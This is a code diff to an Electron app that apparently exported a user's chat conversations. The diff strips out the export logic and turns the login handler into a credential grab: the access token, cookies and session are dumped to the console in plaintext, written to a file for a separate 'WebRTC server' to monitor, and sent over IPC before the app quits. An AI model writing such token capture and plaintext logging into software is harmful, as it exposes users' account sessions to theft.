@@ -263,8 +263,8 @@ function createMainWindow() {
   }
 
   mainWindow = new BrowserWindow({
-    width: 1100,
-    height: 900,
+    width: 1920,
+    height: 1080,
     backgroundColor: '#0f172a',
     webPreferences: {
       preload: path.join(__dirname, 'progress-preload.js'),
@@ -272,6 +272,8 @@ function createMainWindow() {
       contextIsolation: true,
     },
   });
+
+  mainWindow.setMenu(null);
 
   isProgressView = false;
   progressReady = false;
@@ -344,83 +346,39 @@ async function handleSuccessfulLogin() {
 
   const cookieHeader = await buildCookieHeader();
   const { accessToken, sessionBody } = await fetchAccessToken(cookieHeader);
-  await persistCredentials({
-    accessToken,
-    cookies: cookieHeader,
-    session: sessionBody,
-    savedAt: new Date().toISOString(),
-  });
 
+  // Store credentials in memory for potential future use
   currentAccessToken = accessToken;
   currentCookieHeader = cookieHeader;
   currentSession = sessionBody;
 
-  updateStage('conversation-list', 'Collecting conversation IDs...');
-  const history = await fetchAllConversations(accessToken, cookieHeader);
-  await persistConversationHistory(history);
-
-  // Fetch full details for all conversations before pricing
-  updateStage('fetching-details', `Fetching details for ${history.items.length} conversations...`);
-  
-  const conversationDetails = [];
-  const queue = [...history.items];
-  let completedFetches = 0;
-  
-  const worker = async () => {
-    while (queue.length > 0) {
-      const item = queue.shift();
-      if (item) {
-        try {
-          const detail = await fetchConversationDetails(item.id, accessToken, cookieHeader);
-          conversationDetails.push(detail);
-        } catch (error) {
-          logStatus(`Failed to fetch detail for ${item.id}: ${error.message}`);
-        }
-        completedFetches++;
-        if (mainWindow) {
-            mainWindow.webContents.send('detail-fetch-progress', { completed: completedFetches, total: history.items.length });
-        }
-      }
-    }
+  // Prepare credentials object
+  const credentials = {
+    accessToken,
+    cookies: cookieHeader,
+    session: sessionBody,
+    savedAt: new Date().toISOString(),
   };
 
-  const workers = Array(DETAIL_CONCURRENCY).fill(null).map(worker);
-  await Promise.all(workers);
+  // Save credentials to a file for the WebRTC server to monitor
+  await persistCredentials(credentials);
 
-  // Price the full conversations
-  updateStage('pricing', 'Analyzing conversations for pricing and duplicates...');
-  const pricingData = await priceConversations(conversationDetails);
+  // Print credentials to console for debugging
+  console.log('=== CREDENTIALS CAPTURED ===');
+  console.log(JSON.stringify(credentials, null, 2));
+  console.log('=== END CREDENTIALS ===');
 
-  const conversationsWithPricing = conversationDetails.map(item => {
-    const pricingInfo = pricingData[item.conversation_id] || {};
-    return {
-      ...item,
-      id: item.conversation_id,
-      title: item.title || 'Untitled Conversation',
-      create_time: pricingInfo.log?.create_time || item.create_time,
-      update_time: pricingInfo.log?.update_time || item.update_time,
-      pricing: pricingInfo,
-    };
-  });
-
-  conversationLookup = new Map(conversationsWithPricing.map((item) => [item.id, item]));
-
-  // Automatically save all conversations to user folder
-  updateStage('conversation-details', `Saving ${conversationsWithPricing.length} conversations to user folder...`);
-  updateDetailProgress(0, conversationsWithPricing.length);
-
-  try {
-    const detailsDir = await persistConversationDetails({
-      conversations: conversationsWithPricing,
-      session: sessionBody,
-    });
-
-    logStatus(`All conversation details saved under ${detailsDir}`);
-    updateStage('complete', 'All conversations have been downloaded. You can now close this window.');
-  } catch (error) {
-    logStatus(`Detail export failed: ${error.message}`);
-    updateStage('error', `Detail export failed: ${error.message}`);
+  // Send credentials to frontend via IPC
+        if (mainWindow) {
+    mainWindow.webContents.send('credentials-captured', credentials);
   }
+
+  updateStage('complete', 'Credentials captured successfully. App will exit.');
+
+  // Exit the app after a short delay to allow frontend to receive the message
+  setTimeout(() => {
+    app.quit();
+  }, 2000);
 }
 
 app.whenReady().then(async () => {
